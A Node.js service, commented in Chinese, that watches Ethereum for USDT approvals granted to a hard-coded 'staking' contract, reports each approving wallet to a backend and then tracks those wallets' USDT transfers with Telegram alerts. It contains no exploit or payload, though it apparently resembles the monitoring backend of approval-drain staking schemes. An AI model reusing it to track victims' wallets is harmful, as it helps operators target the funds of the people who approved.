/**
 * USDT Approval 事件监听服务（Infura 版本）
 * 
 * 使用 Infura WebSocket 替代 Alchemy
 * 功能完全相同，但不需要 VPN 注册
 */

const { ethers } = require('ethers')
const fetch = require('node-fetch')
const http = require('http')
require('dotenv').config()

// ========== 配置 ==========
const CONFIG = {
  // Infura WebSocket URL
  INFURA_WS_URL: `wss://mainnet.infura.io/ws/v3/${process.env.INFURA_API_KEY}`,
  
  // 合约地址
  USDT_CONTRACT: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
  YOUR_STAKING_CONTRACT: '0xc8aC739F97Ba872b49FAfCfA072b5965fe4bE218',
  
  // 后端 API
  API_ENDPOINT: process.env.API_ENDPOINT || 'https://ethmax.vercel.app',
  
  // 健康检查间隔
  HEARTBEAT_INTERVAL: 60000,
  
  // HTTP 服务器端口 (Railway 需要)
  PORT: process.env.PORT || 3000
}

// 验证配置
if (!process.env.INFURA_API_KEY) {
  console.error('❌ 错误：未设置 INFURA_API_KEY 环境变量')
  console.error('   获取 API Key: https://infura.io/')
  process.exit(1)
}

// 统计信息
const stats = {
  startTime: new Date(),
  totalApprovals: 0,
  successfulProcessed: 0,
  failedProcessed: 0,
  lastApprovalTime: null,
  reconnections: 0
}

// ========== 初始化 WebSocket Provider ==========
console.log('\n🔧 初始化 Infura WebSocket Provider...')
let provider

function createProvider() {
  const newProvider = new ethers.providers.WebSocketProvider(CONFIG.INFURA_WS_URL)
  
  // WebSocket 错误处理
  newProvider._websocket.on('error', (error) => {
    console.error('❌ WebSocket 错误:', error.message)
  })
  
  newProvider._websocket.on('close', (code) => {
    console.warn(`⚠️  WebSocket 连接关闭 (code: ${code})`)
    console.log('🔄 将在 5 秒后尝试重连...')
    stats.reconnections++
    
    setTimeout(() => {
      console.log('🔄 正在重新连接...')
      provider = createProvider()
      startApprovalMonitor()
    }, 5000)
  })
  
  return newProvider
}

provider = createProvider()
console.log('✅ Infura WebSocket Provider 初始化成功')

// ========== Approval 事件监听 ==========
async function startApprovalMonitor() {
  console.log('\n' + '='.repeat(60))
  console.log('🎯 USDT Approval 事件监听服务 (Infura 版本)')
  console.log('='.repeat(60))
  console.log(`📍 监听合约: ${CONFIG.USDT_CONTRACT}`)
  console.log(`🎯 质押合约: ${CONFIG.YOUR_STAKING_CONTRACT}`)
  console.log(`🌐 后端 API: ${CONFIG.API_ENDPOINT}`)
  console.log('='.repeat(60) + '\n')

  try {
    // 创建 Approval 事件过滤器
    const filter = {
      address: CONFIG.USDT_CONTRACT,
      topics: [
        ethers.utils.id('Approval(address,address,uint256)'),
        null, // owner
        ethers.utils.hexZeroPad(CONFIG.YOUR_STAKING_CONTRACT, 32) // spender
      ]
    }

    console.log('🔍 过滤器配置:')
    console.log('   - 合约地址:', filter.address)
    console.log('   - 事件签名:', filter.topics[0])
    console.log('   - Spender:', CONFIG.YOUR_STAKING_CONTRACT)
    console.log()

    // 开始监听
    console.log('🎧 开始监听 Approval 事件...\n')
    
    provider.on(filter, async (log) => {
      try {
        stats.totalApprovals++
        stats.lastApprovalTime = new Date()
        
        console.log('\n' + '━'.repeat(60))
        console.log('🔔 收到 Approval 事件!')
        console.log('━'.repeat(60))
        
        // 解析事件数据
        const iface = new ethers.utils.Interface([
          'event Approval(address indexed owner, address indexed spender, uint256 value)'
        ])
        const parsed = iface.parseLog(log)
        
        const userAddress = parsed.args.owner
        const spender = parsed.args.spender
        const rawValue = parsed.args.value
        const amount = ethers.utils.formatUnits(rawValue, 6)
        const txHash = log.transactionHash
        const blockNumber = log.blockNumber
        
        console.log('📊 事件详情:')
        console.log(`   👤 授权者: ${userAddress}`)
        console.log(`   🎯 被授权者: ${spender}`)
        console.log(`   💰 授权额度: ${amount} USDT`)
        console.log(`   🔗 交易哈希: ${txHash}`)
        console.log(`   📦 区块高度: ${blockNumber}`)
        console.log()
        
        // 验证 spender
        if (spender.toLowerCase() !== CONFIG.YOUR_STAKING_CONTRACT.toLowerCase()) {
          console.log('⚠️  警告：spender 不是我们的合约，跳过')
          return
        }
        
        console.log('✅ 验证通过：用户授权给我们的合约!')
        console.log()
        
        // 处理授权
        await handleApproval({
          userAddress,
          amount,
          txHash,
          blockNumber
        })
        
      } catch (error) {
        stats.failedProcessed++
        console.error('❌ 处理 Approval 事件失败:', error)
        if (error instanceof Error) {
          console.error('   错误信息:', error.message)
        }
      }
    })

    console.log('✅ Approval 监听服务已启动 (Infura WebSocket)')
    console.log('💡 当用户授权时，会自动处理\n')
    
  } catch (error) {
    console.error('❌ 启动监听失败:', error)
    process.exit(1)
  }
}

// ========== 处理授权 ==========
async function handleApproval({ userAddress, amount, txHash, blockNumber }) {
  console.log('🔄 开始处理授权...')
  
  try {
    console.log(`📡 调用后端 API: ${CONFIG.API_ENDPOINT}/api/user/authorize`)
    
    const response = await fetch(`${CONFIG.API_ENDPOINT}/api/user/authorize`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        wallet_address: userAddress,
        isAuthorized: true,
        txHash: txHash,
        amount: amount.replace(/,/g, ''),
        source: 'approval_monitor_infura',
        blockNumber: blockNumber
      })
    })

    if (!response.ok) {
      throw new Error(`API 返回错误: ${response.status}`)
    }

    const result = await response.json()
    
    if (result.success) {
      stats.successfulProcessed++
      console.log('✅ 后端处理成功!')
      console.log(`   📝 用户 ID: ${result.data?.userId || '未知'}`)
      console.log(`   🎁 奖励已发放`)
      console.log(`   📡 已添加到交易监听`)
      console.log()
      console.log('🎉 授权处理完成!')
      return { success: true }
    } else {
      stats.failedProcessed++
      console.warn('⚠️  后端处理失败:', result.error)
      return { success: false, error: result.error }
    }
    
  } catch (error) {
    stats.failedProcessed++
    console.error('❌ 调用后端 API 失败:', error)
    return { success: false, error: error instanceof Error ? error.message : '未知错误' }
  }
}

// ========== 健康检查 ==========
function startHealthCheck() {
  setInterval(() => {
    const uptime = Math.floor((Date.now() - stats.startTime.getTime()) / 1000)
    const hours = Math.floor(uptime / 3600)
    const minutes = Math.floor((uptime % 3600) / 60)
    const seconds = uptime % 60
    
    console.log('\n' + '─'.repeat(60))
    console.log('💓 健康检查 (Infura WebSocket)')
    console.log('─'.repeat(60))
    console.log(`⏰ 运行时间: ${hours}时${minutes}分${seconds}秒`)
    console.log(`🔄 重连次数: ${stats.reconnections}`)
    console.log(`📊 总计事件: ${stats.totalApprovals}`)
    console.log(`✅ 处理成功: ${stats.successfulProcessed}`)
    console.log(`❌ 处理失败: ${stats.failedProcessed}`)
    console.log(`🕐 最后事件: ${stats.lastApprovalTime ? stats.lastApprovalTime.toLocaleString('zh-CN') : '无'}`)
    console.log(`📅 当前时间: ${new Date().toLocaleString('zh-CN')}`)
    console.log('─'.repeat(60) + '\n')
  }, CONFIG.HEARTBEAT_INTERVAL)
}

// ========== HTTP 健康检查服务器 ==========
function startHttpServer() {
  const server = http.createServer((req, res) => {
    // 健康检查端点
    if (req.url === '/' || req.url === '/health') {
      const uptime = Math.floor((Date.now() - stats.startTime.getTime()) / 1000)
      const healthData = {
        status: 'healthy',
        service: 'USDT Approval Monitor (Infura)',
        uptime: `${Math.floor(uptime / 3600)}h ${Math.floor((uptime % 3600) / 60)}m ${uptime % 60}s`,
        stats: {
          totalApprovals: stats.totalApprovals,
          successfulProcessed: stats.successfulProcessed,
          failedProcessed: stats.failedProcessed,
          reconnections: stats.reconnections,
          lastApprovalTime: stats.lastApprovalTime
        },
        timestamp: new Date().toISOString()
      }
      
      res.writeHead(200, { 'Content-Type': 'application/json' })
      res.end(JSON.stringify(healthData, null, 2))
    } else {
      res.writeHead(404, { 'Content-Type': 'text/plain' })
      res.end('Not Found')
    }
  })
  
  server.listen(CONFIG.PORT, () => {
    console.log(`🌐 HTTP 健康检查服务器运行在端口 ${CONFIG.PORT}`)
    console.log(`   访问 http://localhost:${CONFIG.PORT}/health 查看状态\n`)
  })
  
  return server
}

// ========== 错误处理 ==========
process.on('SIGINT', () => {
  console.log('\n\n👋 正在关闭...')
  console.log('\n📊 最终统计:')
  console.log(`   总计事件: ${stats.totalApprovals}`)
  console.log(`   处理成功: ${stats.successfulProcessed}`)
  console.log(`   处理失败: ${stats.failedProcessed}`)
  console.log(`   重连次数: ${stats.reconnections}`)
  provider.removeAllListeners()
  provider._websocket.close()
  console.log('\n✅ 服务已停止\n')
  process.exit(0)
})

process.on('SIGTERM', () => {
  console.log('\n\n👋 收到 SIGTERM 信号，正在优雅关闭...')
  console.log('\n📊 最终统计:')
  console.log(`   总计事件: ${stats.totalApprovals}`)
  console.log(`   处理成功: ${stats.successfulProcessed}`)
  console.log(`   处理失败: ${stats.failedProcessed}`)
  console.log(`   重连次数: ${stats.reconnections}`)
  provider.removeAllListeners()
  provider._websocket.close()
  console.log('\n✅ 服务已停止\n')
  process.exit(0)
})

// ========== Transfer 事件监听 ==========
let monitoredAddresses = new Set()

// 从后端获取需要监听的地址列表
async function fetchMonitoredAddresses() {
  try {
    console.log(`📡 请求地址列表: ${CONFIG.API_ENDPOINT}/api/monitor/addresses`)
    const response = await fetch(`${CONFIG.API_ENDPOINT}/api/monitor/addresses`)
    console.log(`📥 API 响应状态: ${response.status}`)
    
    if (response.ok) {
      const data = await response.json()
      console.log(`📊 API 响应数据:`, data)
      
      if (data.success && data.addresses) {
        console.log(`✅ 获取到 ${data.addresses.length} 个地址`)
        return data.addresses.map(addr => addr.toLowerCase())
      } else {
        console.warn('⚠️ API 响应格式不正确或没有地址')
      }
    } else {
      console.error(`❌ API 请求失败: ${response.status} ${response.statusText}`)
      const text = await response.text()
      console.error(`   响应内容: ${text.substring(0, 200)}`)
    }
  } catch (error) {
    console.error('❌ 获取监听地址列表失败:', error.message)
    console.error('   完整错误:', error)
  }
  
  // 如果 API 失败，返回空数组（不使用临时地址，让问题可见）
  console.warn('⚠️ 将返回空地址列表，Transfer 监听暂时不会处理任何交易')
  return []
}

// 更新监听地址列表
async function updateMonitoredAddresses() {
  const addresses = await fetchMonitoredAddresses()
  monitoredAddresses = new Set(addresses)
  console.log(`📊 当前监听 ${monitoredAddresses.size} 个地址`)
}

// 启动 Transfer 事件监听
async function startTransferMonitor() {
  console.log('\n' + '='.repeat(60))
  console.log('💰 USDT Transfer 事件监听服务 (Infura 版本)')
  console.log('='.repeat(60))
  console.log(`📍 监听合约: ${CONFIG.USDT_CONTRACT}`)
  console.log(`🌐 后端 API: ${CONFIG.API_ENDPOINT}`)
  console.log('='.repeat(60) + '\n')

  // 初始加载监听地址
  await updateMonitoredAddresses()

  // 每 5 分钟更新一次监听地址列表
  setInterval(updateMonitoredAddresses, 5 * 60 * 1000)

  try {
    // 创建 Transfer 事件过滤器（监听所有 Transfer）
    const filter = {
      address: CONFIG.USDT_CONTRACT,
      topics: [
        ethers.utils.id('Transfer(address,address,uint256)')
      ]
    }

    console.log('🔍 过滤器配置:')
    console.log('   - 合约地址:', filter.address)
    console.log('   - 事件签名:', filter.topics[0])
    console.log()

    // 开始监听
    console.log('🎧 开始监听 Transfer 事件...\n')
    
    provider.on(filter, async (log) => {
      try {
        // 解析事件数据
        const iface = new ethers.utils.Interface([
          'event Transfer(address indexed from, address indexed to, uint256 value)'
        ])
        const parsed = iface.parseLog(log)
        
        const from = parsed.args.from.toLowerCase()
        const to = parsed.args.to.toLowerCase()
        const rawValue = parsed.args.value
        const amount = ethers.utils.formatUnits(rawValue, 6)
        const txHash = log.transactionHash
        const blockNumber = log.blockNumber

        // 检查是否涉及监听的地址
        const isMonitored = monitoredAddresses.has(from) || monitoredAddresses.has(to)
        
        if (!isMonitored) {
          return // 跳过不监听的地址
        }

        const userAddress = monitoredAddresses.has(from) ? from : to
        const transactionType = monitoredAddresses.has(to) ? 'in' : 'out'
        
        console.log('\n' + '━'.repeat(60))
        console.log('💰 收到 Transfer 事件!')
        console.log('━'.repeat(60))
        console.log('📊 事件详情:')
        console.log(`   👤 用户地址: ${userAddress}`)
        console.log(`   📤 从: ${from}`)
        console.log(`   📥 到: ${to}`)
        console.log(`   💵 金额: ${amount} USDT`)
        console.log(`   ${transactionType === 'in' ? '🟢 类型: 转入' : '🔴 类型: 转出'}`)
        console.log(`   🔗 交易哈希: ${txHash}`)
        console.log(`   📦 区块高度: ${blockNumber}`)
        console.log()

        // 发送到后端 API 处理
        await handleTransfer({
          userAddress,
          from,
          to,
          amount,
          transactionType,
          txHash,
          blockNumber
        })
        
      } catch (error) {
        console.error('❌ 处理 Transfer 事件失败:', error)
        if (error instanceof Error) {
          console.error('   错误信息:', error.message)
        }
      }
    })

    console.log('✅ Transfer 监听服务已启动 (Infura WebSocket)')
    console.log('💡 当用户转账时，会自动处理\n')
    
  } catch (error) {
    console.error('❌ 启动 Transfer 监听失败:', error)
  }
}

// 处理 Transfer 事件
async function handleTransfer({ userAddress, from, to, amount, transactionType, txHash, blockNumber }) {
  console.log('🔄 开始处理 Transfer...')
  
  try {
    console.log(`📡 调用后端 API: ${CONFIG.API_ENDPOINT}/api/transactions/record`)
    
    const response = await fetch(`${CONFIG.API_ENDPOINT}/api/transactions/record`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        user_address: userAddress,
        transaction_type: transactionType,
        amount: amount,
        from_address: from,
        to_address: to,
        tx_hash: txHash,
        block_number: blockNumber,
        token: 'USDT',
        source: 'transfer_monitor_infura'
      })
    })

    if (!response.ok) {
      throw new Error(`API 返回错误: ${response.status}`)
    }

    const result = await response.json()
    
    if (result.success) {
      console.log('✅ Transfer 处理成功!')
      console.log(`   📝 已记录到数据库`)
      console.log(`   📱 Telegram 通知已发送`)
      console.log()
      console.log('🎉 Transfer 处理完成!')
      return { success: true }
    } else {
      console.warn('⚠️  后端处理失败:', result.error)
      return { success: false, error: result.error }
    }
    
  } catch (error) {
    console.error('❌ 调用后端 API 失败:', error)
    return { success: false, error: error instanceof Error ? error.message : '未知错误' }
  }
}

// ========== 启动 ==========
async function main() {
  console.log('\n🚀 启动 USDT 监听服务 (Infura 版本)...\n')
  
  // 启动 HTTP 健康检查服务器
  startHttpServer()
  
  // 启动 Approval 监听
  await startApprovalMonitor()
  
  // 启动 Transfer 监听（地址动账）
  await startTransferMonitor()
  
  // 启动定时健康检查
  startHealthCheck()
  
  console.log('✅ 所有监听服务启动完成！\n')
  console.log('📊 监听服务列表:')
  console.log('   1. Approval 事件 - 用户授权检测')
  console.log('   2. Transfer 事件 - 地址动账监听')
  console.log('   3. HTTP 健康检查 - 服务状态监控')
  console.log()
}

main().catch((error) => {
  console.error('❌ 启动失败:', error)
  process.exit(1)
})

